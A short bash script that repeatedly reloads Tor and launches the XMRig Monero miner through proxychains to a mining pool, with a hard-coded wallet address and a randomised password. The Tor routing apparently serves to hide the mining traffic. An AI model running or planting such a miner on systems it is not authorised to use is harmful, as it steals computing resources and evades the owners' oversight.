#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --url pool.hashvault.pro:443 --user 449s6YVRR75V9vYpeubTDUDzEPhWJ9SD44GCrEj2o69cbwrLj2urRutfMQ4rX7zqJUMZ52ibquoFs1XQm6TgP9XUGwKKPUf --pass $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 7 | head -n 1) --keepalive --donate-level 1 --tls -t 8
done
